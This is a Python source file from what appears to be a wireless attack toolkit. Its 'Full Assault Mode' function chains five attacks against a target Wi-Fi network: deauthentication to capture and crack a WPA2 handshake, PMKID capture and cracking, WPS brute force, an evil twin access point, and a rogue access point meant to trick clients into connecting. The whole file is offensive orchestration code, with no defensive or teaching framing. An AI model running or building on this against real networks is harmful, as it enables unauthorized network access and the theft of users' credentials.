from src.deauth_controller import run_deauth_attack
from src.pmkid_capture import capture_pmkid
from modules.wps_attack import run_wps_attack
from modules.evil_twin import launch_evil_twin
from modules.rogue_ap import deploy_rogue_ap
from src.cracker import crack_hash
import os

def run_full_assault(interface, target):
    print(f"[*] Launching Full Assault Mode on {target.get('ESSID')}")

    # 1. Attempt handshake capture via deauth
    print("\n--- Phase 1: Handshake Capture (Deauth) ---")
    handshake_file = "handshake-01.cap"
    if os.path.exists(handshake_file):
        os.remove(handshake_file)
    run_deauth_attack(interface, target)
    if os.path.exists(handshake_file):
        print("[+] Handshake captured via deauth!")
        if crack_hash(handshake_file, "WPA2"):
            return # Attack successful
        else:
            print("[-] Cracking failed. Continuing assault...")
    else:
        print("[-] Handshake capture failed.")

    # 2. If handshake fails, try PMKID capture
    print("\n--- Phase 2: PMKID Capture ---")
    pmkid_hash_file = capture_pmkid(interface, target)
    if pmkid_hash_file:
        print("[+] PMKID captured!")
        if crack_hash(pmkid_hash_file, "PMKID"):
            return # Attack successful
        else:
            print("[-] Cracking failed. Continuing assault...")
    else:
        print("[-] PMKID capture failed.")

    # 3. If both fail, run WPS brute
    print("\n--- Phase 3: WPS Brute-force ---")
    # Note: wps_attack.py runs bully which is interactive and may not return a clear success/fail
    # We are running it as part of the chain.
    run_wps_attack(interface)
    print("[*] WPS attack phase complete. Check output for results.")


    # 4. If that fails, launch evil twin attack
    print("\n--- Phase 4: Evil Twin Attack ---")
    print("[!] This attack requires user interaction and may not automatically yield credentials.")
    launch_evil_twin(interface, target)
    print("[*] Evil Twin attack phase complete.")


    # 5. If still unsuccessful, deploy rogue AP
    print("\n--- Phase 5: Rogue AP Deployment ---")
    print("[!] This is a social engineering attack. Monitor for client connections.")
    deploy_rogue_ap(interface, target.get("ESSID"))
    print("[*] Rogue AP deployment phase complete.")

    print("\n[*] Full Assault Mode finished.")
